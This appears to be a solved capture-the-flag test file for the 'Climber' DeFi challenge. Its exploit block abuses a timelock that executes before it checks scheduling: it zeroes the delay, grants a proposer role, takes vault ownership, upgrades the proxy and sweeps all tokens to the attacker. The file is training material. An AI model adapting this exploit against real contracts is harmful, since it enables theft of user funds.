const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        let PROPOSER_ROLE = await ethers.utils.keccak256(
            await ethers.utils.toUtf8Bytes("PROPOSER_ROLE")
        )

        this.helpfulContract = await (await ethers.getContractFactory("myFriendlyAndHelpfulLittleContract", attacker)).deploy();

        let targets = [this.timelock.address, this.timelock.address, this.vault.address, this.helpfulContract.address];
        let values = [0, 0, 0, 0];
        let salt = await ethers.utils.solidityKeccak256(["string"], ["0x"]);

        let iface1 = new ethers.utils.Interface(["function updateDelay(uint64 newDelay)"]);
        let iface2 = new ethers.utils.Interface(["function grantRole(bytes32 role, address account)"]);
        let iface3 = new ethers.utils.Interface(["function transferOwnership(address newOwner)"]);
        let iface4 = new ethers.utils.Interface(["function doStuff(address _attacker, address _vault, address payable _thisTimelock)"]);

        let data = [
            iface1.encodeFunctionData("updateDelay", [0]),
            iface2.encodeFunctionData("grantRole", [PROPOSER_ROLE, this.helpfulContract.address]),
            iface3.encodeFunctionData("transferOwnership", [attacker.address]),
            iface4.encodeFunctionData("doStuff", [attacker.address, this.vault.address, this.timelock.address])
        ];

        await this.timelock.connect(attacker).execute(targets, values, data, salt);


        freeVaultFactory = await ethers.getContractFactory("ClimberVaultV2", attacker);
        this.freeVault = await upgrades.upgradeProxy(this.vault, freeVaultFactory);
        await this.freeVault.connect(attacker).sweepFundsFree(this.token.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
